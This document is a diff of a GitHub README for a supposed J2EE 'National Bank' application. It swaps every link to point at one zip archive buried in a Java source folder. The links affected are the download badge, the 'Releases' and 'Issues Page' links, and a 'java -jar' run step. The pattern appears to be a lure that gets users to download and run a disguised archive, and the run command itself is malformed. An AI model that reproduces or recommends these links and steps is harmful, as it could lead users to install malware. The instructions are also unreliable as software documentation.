@@ -1,6 +1,6 @@
 # 🏦 National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components - A Secure Banking Solution for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip)
+[![Download Now](https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the National Bank application. This guide will help you download and 
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [National Bank Releases](https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip). There, you will find all the available versions of the software.
+To download the application, visit this page: [National Bank Releases](https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip). There, you will find all the available versions of the software.
 
 1. Click on the version you want to download.
 2. Choose the file suitable for your operating system.
@@ -40,7 +40,7 @@ Once the download is complete, follow these steps:
 
 5. **Run the Application:** Once you are in the correct directory, run the command:
    ```
-   java -jar https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip
+   java -jar https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip
    ```
 
 The application should start, and you will see the welcome screen.
@@ -68,11 +68,11 @@ If you encounter any issues, consider the following solutions:
 - Ensure you have installed the correct Java version.
 - Check your internet connection if the application requires online access.
 - Restart the application if it hangs.
-- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip) to report any persistent issues or for troubleshooting tips.
+- Visit our [GitHub Issues Page](https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip) to report any persistent issues or for troubleshooting tips.
 
 ## 🌐 Community and Contributions
 
-We welcome contributions from users who wish to improve the application. Visit our [GitHub Page](https://raw.githubusercontent.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/master/banking/src/main/java/lk/Technologies-Utilizing-Banking-Bank-Components-System-E-National-Advanced-and-Sumo.zip) for instructions on how to help.
+We welcome contributions from users who wish to improve the application. Visit our [GitHub Page](https://github.com/Diantea/National_Bank-A_Banking_System_Utilizing_Advanced_J2EE_Technologies_and_Components/raw/refs/heads/master/core/src/main/java/lk/jiat/app/core/model/Advanced-Utilizing-Components-Technologies-System-E-National-Banking-Bank-and-3.9.zip) for instructions on how to help.
 
 Feel free to explore the topics such as aspect-oriented programming, automated banking, and container-managed transactions for better understanding.
 
